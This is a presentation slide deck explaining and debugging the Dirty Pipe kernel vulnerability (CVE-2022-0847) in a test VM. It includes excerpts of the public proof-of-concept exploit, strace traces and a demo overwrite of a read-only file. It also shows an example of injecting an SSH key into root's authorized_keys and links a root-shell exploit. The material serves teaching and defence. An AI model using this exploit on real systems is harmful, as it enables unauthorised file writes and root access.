---
headingDivider: 2
paginate: true
---

<style>
section {
    justify-content: start;
}
img[alt~="center"] {
    display: block;
    margin: 0 auto;
}

pre {
    font-size: 13pt;
}

.vimCodeElement { white-space: pre-wrap; }
.vimConstant { color: #af5f00; }
.vimLineNr { color: #804000; }
.vimPreProc { color: #c000c0; }
.vimComment { color: #008080; }
</style>

# Debugging Linux Kernel Exploits

#### Dirty Pipe CVE-2022-0847

##### Stefan Walter

## Git repository: README

https://github.com/stfnw/Debugging_Dirty_Pipe_CVE-2022-0847

This repo contains the materials for the presentation on debugging CVE-2022-0847 in the Linux kernel.

Compile slides: (requires make and docker/podman)
```bash
$ make
```

## Outline: Our goal

1. Go through points of disclosure writeup from Max Kellermann theoretically
<!-- First half will be essentially a copy of the blog post -->

2. See vulnerability in practice with a vulnerable system hooked to debuggers

# Dirty Pipe CVE-2022-0847

## General information

* Kernel vulnerability in versions 5.8 to 5.16.11

* Discovered by Max Kellermann

* Allows arbitrary file write on readable files, even in

    - ro files,

    - immutable files, or

    - files on ro filesystems like btrfs ro snapshots

* Also affects e.g. containers and android

## Root problem

* Ultimately caused by incorrect performance optimizations

* More specifically cache handling

* Like so many other problems

<!--
Basic correct implementations of systems can usually be relatively small and easier to verify, but slow.
However it get's really difficult with many performance optimizations.
-->

> There are two hard problems in computer science:
> 1. cache invalidation,
> 2. naming things,
> 3. and off-by-1 errors.

## Openwall mailinglist post

https://www.openwall.com/lists/oss-security/2022/03/07/1

> Date: Mon, 7 Mar 2022 13:01:19 +0100
> From: Max Kellermann <max.kellermann@...os.com>
> To: oss-security@...ts.openwall.com
> Subject: CVE-2022-0847: Linux kernel: overwriting read-only files
>
> Hi oss-security,
>
> two weeks ago, I found a vulnerability in the Linux kernel since
> version 5.8 commit f6dd975583bd ("pipe: merge anon_pipe_buf*_ops") due
> to uninitialized variables.  It enables anybody to write arbitrary
> data to arbitrary files, even if the file is O_RDONLY, immutable or on
> a MS_RDONLY filesystem.

## Openwall mailinglist post

> It can be used to inject code into arbitrary processes.
> It is similar to CVE-2016-5195 "Dirty Cow", but is easier to exploit.
>
> The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
>
> A proof-of-concept exploit is attached.
>
> For anybody curious, here's an article about how I discovered this:
>  https://dirtypipe.cm4all.com/
>
> Max

## Writeups

Official writeup (including PoC): https://dirtypipe.cm4all.com/

Other good source: https://redhuntlabs.com/blog/the-dirty-pipe-vulnerability.html

<!--
we will go through each step later
-->

## Ready-to-run exploit that spawns shell

In exploitdb: https://www.exploit-db.com/exploits/50808

Local Privilege Escalation: Writes in suid executable to get root shell

## Fix in upstream source

* Patch submitted to linux kernel mailing list (LKML):
https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/

* Commit in upstream source:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903

* Fix is literally only two lines

## PoC

Tested on Debian VM with vulnerable kernel version:

```
$ uname -a
Linux debian 5.10.84 #1 SMP Wed Mar 16 09:53:51 UTC 2022 x86_64 GNU/Linux

$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
...
```

<!-- More on setup later -->

## PoC

Proof-of-Concept exploit https://dirtypipe.cm4all.com/#exploiting

* Allows writing of any file

* &lt; 100 lines of well-readable C

* We will use it without modification

* Compile
```bash
gcc -g -o write_anything write_anything.c
```

## PoC: First run

Helper function for preparing non-writable file:

```bash
prepare_file() {
  sudo rm -rfv /tmp/tmp ; mkdir /tmp/tmp
  echo AAAAAA > /tmp/tmp/testfile
  sudo chmod 0444 /tmp/tmp/testfile
  sudo chown -R root:root /tmp/tmp
  sudo -K
  ls -al /tmp/tmp
  cat /tmp/tmp/testfile
}
```

## PoC: First run

First run of PoC:

```bash
$ prepare_file
removed '/tmp/tmp/testfile'
removed directory '/tmp/tmp'
total 12
drwxr-xr-x  2 root root 4096 Apr  1 07:17 .
drwxrwxrwt 11 root root 4096 Apr  1 07:17 ..
-r--r--r--  1 root root    7 Apr  1 07:17 testfile
AAAAAA
```

## PoC: First run

First run of PoC:

```bash
$ ./write_anything /tmp/tmp/testfile 1 $'BBBB'
It worked!

$ cat /tmp/tmp/testfile
ABBBBA

$ ls -al /tmp/tmp/testfile
-r--r--r-- 1 root root 7 Apr  1 07:17 /tmp/tmp/testfile
```

# Building blocks

## Overview

Parts in kernel:

* syscalls

* memory management

* pipes

* some optimizations implemented in kernel

## syscalls

* "System calls"

* Interface between userspace and kernel

* Trigger switch from userspace to kernel

<!--
* For interacting with actual hardware; e.g. output something, file I/O, network I/O, ...
-->

## syscalls

* Good resource: https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-1.html

* syscalls executed by a program can be listed with e.g. `strace`
  from `man strace`:

> strace - trace system calls and signals

<!-- see example later -->

## Memory management

* Memory is divided into **pages**

* One page usually is 4096 bytes in size

Separation:

* **Userspace**: memory for programs

* **Kernelspace**: memory exclusively used by kernel

## Memory management

For our purposes, two kinds of memory managed by CPU/kernel are interesting:

* **Anonymous**:

  - memory requested by applications

  - e.g. for heap/stack of applications

  - not backed by file system

* **Page cache**:

  - backed by file system

  - on file I/O: kernel copies data from disk into pages in page cache

  - further operations happen in cache / in-memory

## Memory management: Simplified example of page cache

Interaction between **program in userspace** and **Linux kernel** for **file I/O**:

- program reads data from file
  *=> kernel copies data to memory/page cache, from there to userspace*

- program reads same data again
  *=> kernel copies data directly from page cache to userspace*

- program writes to file
  *=> kernel copies data from userspace to page cache, marks cache as dirty*

- program ends / closes file
  *=> kernel writes data from page cache back to file on disk*

## Pipes

For example:

```bash
$ ps | less
```

Sidenote: here: socalled *anonymous* pipes.
Completely in memory. (In contrast to *named* pipes).

## Pipes

From `man 7 pipe`:

> Pipes [...] provide a unidirectional interprocess communication channel.

> A pipe has a read end and a write end.

> Data written to the write end of a pipe can be read from the read end of the pipe.

> A pipe is created using pipe(2)
> returns two file descriptors, one referring to the read end of the pipe, the other referring to the write end.

## Pipes

* Buffering data streams

* Implemented with **ring/circular buffer** data structure

* Entries: `struct pipe_buffer` containing

    - pointer to memory page

    - control information / metadata about that page

## Pipes

Circular buffer (By MuhannadAjjan - Own work, CC BY-SA 4.0, https://commons.wikimedia.org/w/index.php?curid=45368479)

![width:15cm center](https://upload.wikimedia.org/wikipedia/commons/f/fd/Circular_Buffer_Animation.gif)

## Pipes

Corresponding syscall: from `man 2 pipe`

```c
int pipe(int pipefd[2]);
int pipe2(int pipefd[2], int flags);
```

> pipe() creates a pipe, a unidirectional data channel that can be used for interprocess communication.

> pipefd is [...] two file descriptors referring to the ends of the pipe.

* > pipefd[0] refers to the read end of the pipe

* > pipefd[1] refers to the write end of the pipe.

> Data written to the write end of the pipe is buffered by the kernel until it is read from the read end of the pipe.

## Pipes

If recent write to pipe does not fill page,
following write may **append data to the existing page**.

## Some optimizations implemented in the kernel

* Focus here: frequent copying data between kernel and userspace

* Switches between kernel- and userspace are relatively expensive for CPU <!-- permission checks, context switch, ... -->

* Depending on source/target, some unnecessary copying occurs; e.g. when

   1. userspace program requests data from kernel,

   2. then passes same data right back to kernel for next operation

## Some optimizations implemented in the kernel

Example special cases:

* allow userspace program direct access to page cache => `mmap`

* between a pipe and something else => `splice`

Relevant here: `splice`

## Splice

From `man 2 splice`:

* > splice() moves data between two file descriptors

* > without copying between kernel address space and user address space

* > one of the file descriptors must refer to a pipe

## Splice

From `man 2 splice`: Function prototype

```c
ssize_t splice(int fd_in,  off64_t *off_in,
               int fd_out, off64_t *off_out,
               size_t len, unsigned int flags);
```

> transfers

* > up to `len` bytes of data

* > from the file descriptor `fd_in`

* > to the file descriptor `fd_out`

* `off_in` and `off_out` are offsets in `fd_in` and `fd_out`

## Splice

From `man 2 splice`:

* > actual copies are generally avoided

* > implementing a pipe buffer as [...] pointers to pages of kernel memory

* > only pointers are copied, not the pages of the buffer

## Sidenote: File descriptors

Used by kernel to **identify open files**

From `man 2 open`:

> The return value of open() is a file descriptor, a small, nonnegative integer that is an index to an entry in the process's table of open file descriptors.

> The file descriptor is used in subsequent system calls (read(2), write(2), lseek(2), fcntl(2), etc.) to refer to the open file.

> The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process.

## Sidenote: File descriptors

Prototype of e.g. `open`:

```c
int open(const char *pathname, int flags);
int open(const char *pathname, int flags, mode_t mode);
```

=> fd implemented as `int`

# Assembling the pieces

## Problem

For pipes:

* recap: kernel keeps control information/flags about each page

* recap: writes may append data to current page

* flag `PIPE_BUF_FLAG_CAN_MERGE` indicates, whether pipe page can be appended to
  (this should be forbidden in certain scenarios, see next slide)

## Problem

**Problem: after `splice` from file to pipe**

* kernel loads data into memory page in page cache

* entry in pipe buffer points directly to that page (optimization, zero-copy)

## Problem

Vulnerability: **Incomplete reset of control information** in following scenario

* page in pipe buffer was once appendable (default for anonymous pipes)

* `splice` swaps out target pointer of page pointed to in pipe buffer
  to page in page cache (= backed by file on disk)

* **but: control information (`PIPE_BUF_FLAG_CAN_MERGE`) is not reset**

* => **page stays appendable**

* writes to pipe modify page and mark page cache dirty
  => propagate to disk

## Summary exploit prerequisites

* read permission on file
  *(for `splice`-ing from it)*

* offset mustn't be on page boundary
  *(for page to be in page cache / backed by file on disk)*

* write can't cross page boundary
  *(otherwise creates new anonymous buffer not backed by file)*

* file can't be resized

<!--
We will go step-by-step from observing the overall behavior,
to looking at and debugging / stepping through the actual source code.
-->

## High-level walkthrough

<!-- Explain/visualize live with drawing on graphic tablet -->

<!-- Map graphic tablet to output
$ xinput map-to-output "UGTABLET DECO 01 Pen (0)" DP-3
-->

<!--
Disclaimer: exact details / offsets / pointers may be inaccurate
Goal: convey idea
-->

## Fix in upstream source

Literally only two lines, initializing flags. Patch from Max Kellermann:

```diff
diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15..6dd5330f7a995 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf->ops = &page_cache_pipe_buf_ops;
+	buf->flags = 0;
 	get_page(page);
 	buf->page = page;
 	buf->offset = offset;
@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
 			break;
 
 		buf->ops = &default_pipe_buf_ops;
+		buf->flags = 0;
 		buf->page = page;
 		buf->offset = 0;
 		buf->len = min_t(ssize_t, left, PAGE_SIZE);
```

## syscalls in PoC: list with strace: startup

Program startup: uninteresting here

```
$ strace ./write_anything /tmp/tmp/testfile 1 $'BBBB'
execve("./write_anything", ["./write_anything", "/tmp/tmp/testfile", "1", "BBBB"], 0x7ffd0461c238 /* 24 vars */) = 0
brk(NULL)                               = 0x55f215d71000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=69733, ...}) = 0
mmap(NULL, 69733, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ff7008a9000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@n\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff7008a7000
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ff7006e2000
mprotect(0x7ff700707000, 1662976, PROT_NONE) = 0
mmap(0x7ff700707000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ff700707000
mmap(0x7ff700852000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x170000) = 0x7ff700852000
mmap(0x7ff70089d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7ff70089d000
mmap(0x7ff7008a3000, 13576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ff7008a3000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ff7008a8540) = 0
mprotect(0x7ff70089d000, 12288, PROT_READ) = 0
mprotect(0x55f215bda000, 4096, PROT_READ) = 0
mprotect(0x7ff7008e5000, 4096, PROT_READ) = 0
munmap(0x7ff7008a9000, 69733)           = 0
```

## syscalls in PoC: list with strace: relevant part

```
openat(AT_FDCWD, "/tmp/tmp/testfile", O_RDONLY) = 3
fstat(3, {st_mode=S_IFREG|0444, st_size=7, ...}) = 0
pipe([4, 5])                            = 0
fcntl(5, F_GETPIPE_SZ)                  = 65536
write(5, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
...
write(5, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
read(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
...
read(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
splice(3, [0], 5, NULL, 1, 0)           = 1
write(5, "BBBB", 4)                     = 4
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
brk(NULL)                               = 0x55f215d71000
brk(0x55f215d92000)                     = 0x55f215d92000
write(1, "It worked!\n", 11It worked!
)            = 11
exit_group(0)                           = ?
+++ exited with 0 +++
```

## PoC: license `write_anything.c` (for reference)

<pre class='vimCodeElement'>
<span id="L1_1648329107" class="vimLineNr"> 1 </span><span class="vimComment">/*</span><span class="vimComment"> SPDX-License-Identifier: GPL-2.0 </span><span class="vimComment">*/</span>
<span id="L2_1648329107" class="vimLineNr"> 2 </span><span class="vimComment">/*</span>
<span id="L3_1648329107" class="vimLineNr"> 3 </span><span class="vimComment"> * Copyright 2022 CM4all GmbH / IONOS SE</span>
<span id="L4_1648329107" class="vimLineNr"> 4 </span><span class="vimComment"> *</span>
<span id="L5_1648329107" class="vimLineNr"> 5 </span><span class="vimComment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span>
<span id="L6_1648329107" class="vimLineNr"> 6 </span><span class="vimComment"> *</span>
<span id="L7_1648329107" class="vimLineNr"> 7 </span><span class="vimComment"> * Proof-of-concept exploit for the Dirty Pipe</span>
<span id="L8_1648329107" class="vimLineNr"> 8 </span><span class="vimComment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span>
<span id="L9_1648329107" class="vimLineNr"> 9 </span><span class="vimComment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span>
<span id="L10_1648329107" class="vimLineNr">10 </span><span class="vimComment"> * file contents in the page cache, even if the file is not permitted</span>
<span id="L11_1648329107" class="vimLineNr">11 </span><span class="vimComment"> * to be written, immutable or on a read-only mount.</span>
<span id="L12_1648329107" class="vimLineNr">12 </span><span class="vimComment"> *</span>
<span id="L13_1648329107" class="vimLineNr">13 </span><span class="vimComment"> * This exploit requires Linux 5.8 or later; the code path was made</span>
<span id="L14_1648329107" class="vimLineNr">14 </span><span class="vimComment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span>
<span id="L15_1648329107" class="vimLineNr">15 </span><span class="vimComment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span>
<span id="L16_1648329107" class="vimLineNr">16 </span><span class="vimComment"> * there before, it just provided an easy way to exploit it.</span>
<span id="L17_1648329107" class="vimLineNr">17 </span><span class="vimComment"> *</span>
<span id="L18_1648329107" class="vimLineNr">18 </span><span class="vimComment"> * There are two major limitations of this exploit: the offset cannot</span>
<span id="L19_1648329107" class="vimLineNr">19 </span><span class="vimComment"> * be on a page boundary (it needs to write one byte before the offset</span>
<span id="L20_1648329107" class="vimLineNr">20 </span><span class="vimComment"> * to add a reference to this page to the pipe), and the write cannot</span>
<span id="L21_1648329107" class="vimLineNr">21 </span><span class="vimComment"> * cross a page boundary.</span>
<span id="L22_1648329107" class="vimLineNr">22 </span><span class="vimComment"> *</span>
<span id="L23_1648329107" class="vimLineNr">23 </span><span class="vimComment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'</span>
<span id="L24_1648329107" class="vimLineNr">24 </span><span class="vimComment"> *</span>
<span id="L25_1648329107" class="vimLineNr">25 </span><span class="vimComment"> * Further explanation: <a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></span>
<span id="L26_1648329107" class="vimLineNr">26 </span><span class="vimComment"> </span><span class="vimComment">*/</span>
</pre>

<!-- Numbers are file descriptors -->

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
openat(AT_FDCWD, "/tmp/tmp/testfile", O_RDONLY) = 3
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L98_1648327564" class="vimLineNr"> 98 </span>        <span class="vimComment">/*</span><span class="vimComment"> open the input file and validate the specified offset </span><span class="vimComment">*/</span>
<span id="L99_1648327564" class="vimLineNr"> 99 </span>        <span class="vimType">const</span> <span class="vimType">int</span> fd = open(path, O_RDONLY); <span class="vimComment">// yes, read-only! :-)</span>
<span id="L100_1648327564" class="vimLineNr">100 </span>        <span class="vimStatement">if</span> (fd &lt; <span class="vimConstant">0</span>) {
<span id="L101_1648327564" class="vimLineNr">101 </span>                perror(<span class="vimConstant">&quot;open failed&quot;</span>);
<span id="L102_1648327564" class="vimLineNr">102 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L103_1648327564" class="vimLineNr">103 </span>        }
</pre>

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
fstat(3, {st_mode=S_IFREG|0444, st_size=7, ...}) = 0
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L105_1648329388" class="vimLineNr">105 </span>        <span class="vimType">struct</span> stat st;
<span id="L106_1648329388" class="vimLineNr">106 </span>        <span class="vimStatement">if</span> (fstat(fd, &amp;st)) {
<span id="L107_1648329388" class="vimLineNr">107 </span>                perror(<span class="vimConstant">&quot;stat failed&quot;</span>);
<span id="L108_1648329388" class="vimLineNr">108 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L109_1648329388" class="vimLineNr">109 </span>        }
<span id="L110_1648329388" class="vimLineNr">110 </span>
<span id="L111_1648329388" class="vimLineNr">111 </span>        <span class="vimStatement">if</span> (offset &gt; st.st_size) {
<span id="L112_1648329388" class="vimLineNr">112 </span>                fprintf(<span class="vimConstant">stderr</span>, <span class="vimConstant">&quot;Offset is not inside the file</span><span class="vimSpecial">\n</span><span class="vimConstant">&quot;</span>);
<span id="L113_1648329388" class="vimLineNr">113 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L114_1648329388" class="vimLineNr">114 </span>        }
<span id="L115_1648329388" class="vimLineNr">115 </span>
<span id="L116_1648329388" class="vimLineNr">116 </span>        <span class="vimStatement">if</span> (end_offset &gt; st.st_size) {
<span id="L117_1648329388" class="vimLineNr">117 </span>                fprintf(<span class="vimConstant">stderr</span>, <span class="vimConstant">&quot;Sorry, cannot enlarge the file</span><span class="vimSpecial">\n</span><span class="vimConstant">&quot;</span>);
<span id="L118_1648329388" class="vimLineNr">118 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L119_1648329388" class="vimLineNr">119 </span>        }
</pre>

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
pipe([4, 5])                            = 0
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L47_1648327865" class="vimLineNr">47 </span>        <span class="vimStatement">if</span> (pipe(p)) abort();
</pre>

Note:

* 4 and 5 are *both* new file descriptors returned by `pipe`

* ends of pipe are not connected to anything yet

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
fcntl(5, F_GETPIPE_SZ)                  = 65536
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L49_1648328722" class="vimLineNr">49 </span>        <span class="vimType">const</span> <span class="vimType">unsigned</span> pipe_size = fcntl(p[<span class="vimConstant">1</span>], F_GETPIPE_SZ);
</pre>

Note: get size of pipe circular buffer

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
write(5, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
...
write(5, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L50_1648328864" class="vimLineNr">50 </span>        <span class="vimType">static</span> <span class="vimType">char</span> buffer[<span class="vimConstant">4096</span>];
<span id="L51_1648328864" class="vimLineNr">51 </span>
<span id="L52_1648328864" class="vimLineNr">52 </span>        <span class="vimComment">/*</span><span class="vimComment"> fill the pipe completely; each pipe_buffer will now have</span>
<span id="L53_1648328864" class="vimLineNr">53 </span><span class="vimComment">           the PIPE_BUF_FLAG_CAN_MERGE flag </span><span class="vimComment">*/</span>
<span id="L54_1648328864" class="vimLineNr">54 </span>        <span class="vimStatement">for</span> (<span class="vimType">unsigned</span> r = pipe_size; r &gt; <span class="vimConstant">0</span>;) {
<span id="L55_1648328864" class="vimLineNr">55 </span>                <span class="vimType">unsigned</span> n = r &gt; <span class="vimStatement">sizeof</span>(buffer) ? <span class="vimStatement">sizeof</span>(buffer) : r;
<span id="L56_1648328864" class="vimLineNr">56 </span>                write(p[<span class="vimConstant">1</span>], buffer, n);
<span id="L57_1648328864" class="vimLineNr">57 </span>                r -= n;
<span id="L58_1648328864" class="vimLineNr">58 </span>        }
</pre>

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
read(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
...
read(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L60_1648328902" class="vimLineNr">60 </span>        <span class="vimComment">/*</span><span class="vimComment"> drain the pipe, freeing all pipe_buffer instances (but</span>
<span id="L61_1648328902" class="vimLineNr">61 </span><span class="vimComment">           leaving the flags initialized) </span><span class="vimComment">*/</span>
<span id="L62_1648328902" class="vimLineNr">62 </span>        <span class="vimStatement">for</span> (<span class="vimType">unsigned</span> r = pipe_size; r &gt; <span class="vimConstant">0</span>;) {
<span id="L63_1648328902" class="vimLineNr">63 </span>                <span class="vimType">unsigned</span> n = r &gt; <span class="vimStatement">sizeof</span>(buffer) ? <span class="vimStatement">sizeof</span>(buffer) : r;
<span id="L64_1648328902" class="vimLineNr">64 </span>                read(p[<span class="vimConstant">0</span>], buffer, n);
<span id="L65_1648328902" class="vimLineNr">65 </span>                r -= n;
<span id="L66_1648328902" class="vimLineNr">66 </span>        }
</pre>

<pre class='vimCodeElement'>
<span id="L68_1648328920" class="vimLineNr">68 </span>        <span class="vimComment">/*</span><span class="vimComment"> the pipe is now empty, and if somebody adds a new</span>
<span id="L69_1648328920" class="vimLineNr">69 </span><span class="vimComment">           pipe_buffer without initializing its &quot;flags&quot;, the buffer</span>
<span id="L70_1648328920" class="vimLineNr">70 </span><span class="vimComment">           will be mergeable </span><span class="vimComment">*/</span>
</pre>

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
splice(3, [0], 5, NULL, 1, 0)           = 1
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L126_1648329016" class="vimLineNr">126 </span>        <span class="vimComment">/*</span><span class="vimComment"> splice one byte from before the specified offset into the</span>
<span id="L127_1648329016" class="vimLineNr">127 </span><span class="vimComment">           pipe; this will add a reference to the page cache, but</span>
<span id="L128_1648329016" class="vimLineNr">128 </span><span class="vimComment">           since copy_page_to_iter_pipe() does not initialize the</span>
<span id="L129_1648329016" class="vimLineNr">129 </span><span class="vimComment">           &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set </span><span class="vimComment">*/</span>
<span id="L130_1648329016" class="vimLineNr">130 </span>        --offset;
<span id="L131_1648329016" class="vimLineNr">131 </span>        <span class="vimType">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="vimConstant">1</span>], <span class="vimConstant">NULL</span>, <span class="vimConstant">1</span>, <span class="vimConstant">0</span>);
<span id="L132_1648329016" class="vimLineNr">132 </span>        <span class="vimStatement">if</span> (nbytes &lt; <span class="vimConstant">0</span>) {
<span id="L133_1648329016" class="vimLineNr">133 </span>                perror(<span class="vimConstant">&quot;splice failed&quot;</span>);
<span id="L134_1648329016" class="vimLineNr">134 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L135_1648329016" class="vimLineNr">135 </span>        }
<span id="L136_1648329016" class="vimLineNr">136 </span>        <span class="vimStatement">if</span> (nbytes == <span class="vimConstant">0</span>) {
<span id="L137_1648329016" class="vimLineNr">137 </span>                fprintf(<span class="vimConstant">stderr</span>, <span class="vimConstant">&quot;short splice</span><span class="vimSpecial">\n</span><span class="vimConstant">&quot;</span>);
<span id="L138_1648329016" class="vimLineNr">138 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L139_1648329016" class="vimLineNr">139 </span>        }
</pre>

Note: splice **from** file **to** pipe write end

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
write(5, "BBBB", 4)                     = 4
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L141_1648329209" class="vimLineNr">141 </span>        <span class="vimComment">/*</span><span class="vimComment"> the following write will not create a new pipe_buffer, but</span>
<span id="L142_1648329209" class="vimLineNr">142 </span><span class="vimComment">           will instead write into the page cache, because of the</span>
<span id="L143_1648329209" class="vimLineNr">143 </span><span class="vimComment">           PIPE_BUF_FLAG_CAN_MERGE flag </span><span class="vimComment">*/</span>
<span id="L144_1648329209" class="vimLineNr">144 </span>        nbytes = write(p[<span class="vimConstant">1</span>], data, data_size);
<span id="L145_1648329209" class="vimLineNr">145 </span>        <span class="vimStatement">if</span> (nbytes &lt; <span class="vimConstant">0</span>) {
<span id="L146_1648329209" class="vimLineNr">146 </span>                perror(<span class="vimConstant">&quot;write failed&quot;</span>);
<span id="L147_1648329209" class="vimLineNr">147 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L148_1648329209" class="vimLineNr">148 </span>        }
<span id="L149_1648329209" class="vimLineNr">149 </span>        <span class="vimStatement">if</span> ((<span class="vimType">size_t</span>)nbytes &lt; data_size) {
<span id="L150_1648329209" class="vimLineNr">150 </span>                fprintf(<span class="vimConstant">stderr</span>, <span class="vimConstant">&quot;short write</span><span class="vimSpecial">\n</span><span class="vimConstant">&quot;</span>);
<span id="L151_1648329209" class="vimLineNr">151 </span>                <span class="vimStatement">return</span> <span class="vimConstant">EXIT_FAILURE</span>;
<span id="L152_1648329209" class="vimLineNr">152 </span>        }
</pre>

Note: since file is opened read-only, **this write should fail**

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
brk(NULL)                               = 0x55f215d71000
brk(0x55f215d92000)                     = 0x55f215d92000
write(1, "It worked!\n", 11It worked!
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L154_1648329532" class="vimLineNr">154 </span>        printf(<span class="vimConstant">&quot;It worked!</span><span class="vimSpecial">\n</span><span class="vimConstant">&quot;</span>);
</pre>

## syscalls in PoC: list with strace: step-by-step

Excerpt strace / syscall:

```
exit_group(0)                           = ?
+++ exited with 0 +++
```

Excerpt PoC source from `write_anything.c`:

<pre class='vimCodeElement'>
<span id="L155_1648329558" class="vimLineNr">155 </span>        <span class="vimStatement">return</span> <span class="vimConstant">EXIT_SUCCESS</span>;
</pre>

## What we've done

Recap:

* We walked through PoC / userspace code

* We understood vulnerability on a high level

Next:

* Debugging

* Dig into kernel code where vulnerability actually happens

# Debugging

## Setup

Like described in previous lesson we will use qemu debian VM.
See slides for previous session.
But we need vulnerable kernel version.

## Setup

Refer to https://security-tracker.debian.org/tracker/CVE-2022-0847

=> bullseye 5.10.84-1 is vulnerable

![](images/debian_tracker.png)

## Setup: Quick recap kernel compilation and installation

* Debian VM (here with qemu, libvirt)

* Kernel parameters (in VM): edit `/etc/default/grub`, then `sudo update-grub`

```diff
-GRUB_CMDLINE_LINUX_DEFAULT="quiet"
+GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr"
```

## Setup: Quick recap kernel compilation and installation

* Qemu commandline options (on host):

```xml
